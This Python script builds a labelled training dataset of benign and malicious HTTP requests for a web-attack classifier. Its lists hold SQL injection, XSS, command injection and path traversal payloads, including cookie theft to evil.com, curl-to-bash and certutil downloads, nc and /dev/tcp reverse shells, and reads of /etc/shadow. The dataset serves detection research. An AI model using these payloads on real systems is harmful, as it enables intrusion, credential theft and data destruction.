"""
CSIC 2010 & Synthetic Multi-Class HTTP Dataset Builder.
Generates a representative, balanced research dataset across 5 threat classes:
1. NORMAL
2. SQL_INJECTION
3. CROSS_SITE_SCRIPTING
4. COMMAND_INJECTION
5. PATH_TRAVERSAL
"""

import os
import pandas as pd

# 1. Normal / Benign HTTP Requests
BENIGN_REQUESTS = [
    "GET / HTTP/1.1",
    "GET /index.html HTTP/1.1",
    "GET /products HTTP/1.1",
    "GET /products?category=electronics&sort=price_asc HTTP/1.1",
    "GET /products/123 HTTP/1.1",
    "GET /products/search?q=laptop+backpack HTTP/1.1",
    "GET /products/search?q=wireless+noise+cancelling+headphones HTTP/1.1",
    "GET /products/search?q=usb+c+hub+multiport+adapter HTTP/1.1",
    "GET /catalog/items?page=2&limit=20 HTTP/1.1",
    "GET /about-us HTTP/1.1",
    "GET /contact HTTP/1.1",
    "GET /faq HTTP/1.1",
    "GET /terms-of-service HTTP/1.1",
    "GET /privacy-policy HTTP/1.1",
    "GET /blog/cybersecurity-best-practices HTTP/1.1",
    "GET /static/css/main.css HTTP/1.1",
    "GET /static/js/bundle.js HTTP/1.1",
    "GET /static/images/logo.png HTTP/1.1",
    "GET /favicon.ico HTTP/1.1",
    "GET /api/v1/health HTTP/1.1",
    "GET /api/v1/status HTTP/1.1",
    "GET /api/v1/users/profile HTTP/1.1",
    "GET /api/v1/cart HTTP/1.1",
    "GET /api/v1/orders/recent HTTP/1.1",
    "POST /login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"username\": \"john_doe\", \"password\": \"SuperSecretPass123!\"}",
    "POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=alice&password=SecurePassword456",
    "POST /register HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"username\": \"new_user\", \"email\": \"user@example.com\", \"password\": \"StrongPass789!\"}",
    "POST /api/v1/cart/items HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"product_id\": 42, \"quantity\": 2}",
    "POST /api/v1/checkout HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"shipping_address\": \"123 Tech Lane, Suite 400\", \"card_last4\": \"4242\"}",
    "POST /contact/feedback HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nname=Bob+Smith&email=bob@company.org&message=Great+customer+service+thank+you",
    "PUT /api/v1/users/settings HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"theme\": \"dark\", \"notifications\": true}",
    "DELETE /api/v1/cart/items/42 HTTP/1.1",
    "GET /search?q=python+programming+fundamentals+edition+3 HTTP/1.1",
    "GET /search?q=european+union+trade+regulations+summary HTTP/1.1",
    "GET /search?q=select+color+options+for+winter+jackets HTTP/1.1",
    "GET /support/tickets/new?category=billing HTTP/1.1",
    "GET /reports/quarterly-summary-2025.pdf HTTP/1.1",
    "GET /api/v1/metrics?interval=1h&format=json HTTP/1.1",
    "GET /docs/api/swagger.json HTTP/1.1",
    "POST /api/v1/subscriptions HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"plan\": \"enterprise\", \"billing_cycle\": \"annual\"}",
]

# 2. SQL Injection Requests
SQLI_REQUESTS = [
    "GET /products?id=1%27%20OR%201=1-- HTTP/1.1",
    "GET /items?id=105%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1",
    "GET /search?q=laptop%27%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables-- HTTP/1.1",
    "GET /profile?user=admin%27%20OR%20%27a%27=%27a HTTP/1.1",
    "GET /orders?order_id=50%20ORDER%20BY%2010 HTTP/1.1",
    "POST /login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"username\": \"admin' OR 1=1--\", \"password\": \"anything\"}",
    "POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin%27+OR+1%3D1--&password=x",
    "GET /search?q=item%27;%20DROP%20TABLE%20users;-- HTTP/1.1",
    "GET /api/items?cat=1;%20EXEC%20xp_cmdshell('whoami');-- HTTP/1.1",
    "GET /products?id=1%20AND%20SLEEP(5)-- HTTP/1.1",
    "GET /users?id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a) HTTP/1.1",
    "GET /search?q=%2527%2520OR%25201%253D1-- HTTP/1.1",
    "GET /items?name=test%27%20HAVING%201=1-- HTTP/1.1",
    "POST /api/v1/query HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"filter\": \"category' UNION SELECT cc_number, cvv FROM credit_cards--\"}",
    "GET /catalog?cat=books%27%20OR%20(SELECT%20count(*)%20FROM%20admin)%3E0-- HTTP/1.1",
    "GET /data?id=1%20AND%201=(SELECT%20TOP%201%20table_name%20FROM%20information_schema.tables) HTTP/1.1",
    "GET /lookup?ip=127.0.0.1%27;%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1",
    "GET /articles?tag=sec%27%20AND%20ASCII(SUBSTRING((SELECT%20USER()),1,1))=97-- HTTP/1.1",
    "GET /products?id=1/*inline_comment*/OR/*comment*/1=1 HTTP/1.1",
    "POST /api/v1/feedback HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"comment\": \"Great'; INSERT INTO admins (user, pass) VALUES ('hacker', 'pwned');--\"}",
]

# 3. Cross-Site Scripting (XSS) Requests
XSS_REQUESTS = [
    "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1",
    "GET /search?q=%3Cscript%20src=%22http://attacker.com/evil.js%22%3E%3C/script%3E HTTP/1.1",
    "GET /profile?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E HTTP/1.1",
    "GET /welcome?msg=%3Csvg%20onload=alert(%27XSS%27)%3E HTTP/1.1",
    "GET /preview?url=javascript:alert(document.domain) HTTP/1.1",
    "GET /link?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== HTTP/1.1",
    "GET /search?q=%26lt;script%26gt;alert(1)%26lt;/script%26gt; HTTP/1.1",
    "GET /search?q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E HTTP/1.1",
    "POST /comment HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"author\": \"guest\", \"text\": \"<script>document.location='http://evil.com/?c='+document.cookie</script>\"}",
    "POST /comment HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nauthor=test&text=%3Cbody+onload%3Dalert%281%29%3E",
    "GET /redirect?url=%3Ciframe%20src=%22javascript:alert(1)%22%3E%3C/iframe%3E HTTP/1.1",
    "GET /search?q=%3Ca%20href=%22javascript:alert(1)%22%3EClick%20Here%3C/a%3E HTTP/1.1",
    "GET /index.php?param=%3Cinput%20type=%22text%22%20onfocus=%22alert(1)%22%20autofocus%3E HTTP/1.1",
    "GET /test?input=%3Cdetails%20open%20ontoggle=alert(1)%3E HTTP/1.1",
    "GET /page?name=%3Cobject%20data=%22javascript:alert(1)%22%3E HTTP/1.1",
    "POST /api/v1/profile HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"bio\": \"<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>\"}",
    "GET /search?q=%3Cbase%20href=%22http://attacker.com/%22%3E HTTP/1.1",
    "GET /search?q=%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1)%22%3E HTTP/1.1",
    "GET /lookup?q=%3Cscript%3Efetch(%27http://evil.com/%27%2Bdocument.cookie)%3C/script%3E HTTP/1.1",
    "GET /items?id=1%22%20onmouseover=%22alert(1)%22%20style=%22position:absolute;width:100%25;height:100%25 HTTP/1.1",
]

# 4. Command Injection Requests
COMMAND_REQUESTS = [
    "GET /lookup?ip=127.0.0.1;%20whoami HTTP/1.1",
    "GET /lookup?ip=127.0.0.1;%20cat%20/etc/passwd HTTP/1.1",
    "GET /status?host=localhost%20|%20id HTTP/1.1",
    "GET /ping?target=127.0.0.1%20&&%20uname%20-a HTTP/1.1",
    "GET /exec?cmd=echo%20test%20|%20sh HTTP/1.1",
    "GET /service?name=test;%20curl%20http://attacker.com/malware.sh%20|%20bash HTTP/1.1",
    "GET /process?pid=100;%20powershell.exe%20-Command%20whoami HTTP/1.1",
    "GET /ping?host=127.0.0.1%20`whoami` HTTP/1.1",
    "GET /ping?host=127.0.0.1$(whoami) HTTP/1.1",
    "POST /api/v1/network/ping HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"destination\": \"127.0.0.1; cat /etc/shadow\"}",
    "GET /tools/dns?host=8.8.8.8;%20nc%20-e%20/bin/sh%2010.0.0.1%204444 HTTP/1.1",
    "GET /lookup?domain=google.com%20|%20base64%20-d HTTP/1.1",
    "GET /system?task=backup;%20rm%20-rf%20/var/log/* HTTP/1.1",
    "GET /run?action=check;%20bash%20-i%20>%20/dev/tcp/10.0.0.1/4444%202>&1 HTTP/1.1",
    "GET /diag?cmd=ipconfig%20&%20net%20user%20hacker%20Pass123!%20/add HTTP/1.1",
    "POST /diagnostics HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ntarget=127.0.0.1%3B+wget+http%3A%2F%2Fevil.com%2Fbot+-O+%2Ftmp%2Fbot",
    "GET /log?file=app.log;%20cat%20${IFS}/etc/passwd HTTP/1.1",
    "GET /check?host=127.0.0.1;%20python%20-c%20'import%20socket,subprocess,os;s=socket.socket()...' HTTP/1.1",
    "GET /report?id=123;%20ls%20-la%20/home HTTP/1.1",
    "GET /service?status=1;%20certutil.exe%20-urlcache%20-f%20http://evil.com/payload.exe HTTP/1.1",
]

# 5. Path Traversal Requests
TRAVERSAL_REQUESTS = [
    "GET /files?filename=../../../../etc/passwd HTTP/1.1",
    "GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1",
    "GET /view?doc=%252e%252e%252f%252e%252e%252fetc%2fshadow HTTP/1.1",
    "GET /images?path=..\\..\\windows\\win.ini HTTP/1.1",
    "GET /docs?item=....//....//....//etc/passwd HTTP/1.1",
    "GET /download?file=/var/www/../../etc/hosts HTTP/1.1",
    "GET /files?name=report.pdf%00.exe HTTP/1.1",
    "GET /files?filename=../../../../windows/system32/cmd.exe HTTP/1.1",
    "GET /api/v1/files/read?path=/proc/self/environ HTTP/1.1",
    "GET /api/v1/files/read?path=..%252f..%252f..%252fetc/passwd HTTP/1.1",
    "GET /logs?name=../../../../boot.ini HTTP/1.1",
    "POST /api/v1/export HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"template\": \"../../../../etc/passwd\"}",
    "GET /static?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1",
    "GET /load?template=..\\..\\..\\..\\windows\\repair\\sam HTTP/1.1",
    "GET /media?img=..//..//..//etc//passwd HTTP/1.1",
    "GET /download?file=../../../../proc/version HTTP/1.1",
    "GET /fetch?doc=test/../../../../etc/group HTTP/1.1",
    "GET /read?file=..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1",
    "GET /reports?filename=../../../conf/server.xml HTTP/1.1",
    "GET /attachments?file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts HTTP/1.1",
]


def build_curated_dataset(output_path: str = "ml/data/processed/dataset.csv") -> pd.DataFrame:
    """Combines all curated categories into a standardized dataset."""
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    records = []

    for req in BENIGN_REQUESTS:
        records.append({"request": req, "label": "NORMAL", "attack_type": "NORMAL"})

    for req in SQLI_REQUESTS:
        records.append({"request": req, "label": "MALICIOUS", "attack_type": "SQL_INJECTION"})

    for req in XSS_REQUESTS:
        records.append({"request": req, "label": "MALICIOUS", "attack_type": "CROSS_SITE_SCRIPTING"})

    for req in COMMAND_REQUESTS:
        records.append({"request": req, "label": "MALICIOUS", "attack_type": "COMMAND_INJECTION"})

    for req in TRAVERSAL_REQUESTS:
        records.append({"request": req, "label": "MALICIOUS", "attack_type": "PATH_TRAVERSAL"})

    df = pd.DataFrame(records)
    df.to_csv(output_path, index=False)
    print(f"Dataset successfully built with {len(df)} samples across {df['attack_type'].nunique()} classes.")
    print(df["attack_type"].value_counts())
    return df


if __name__ == "__main__":
    build_curated_dataset()
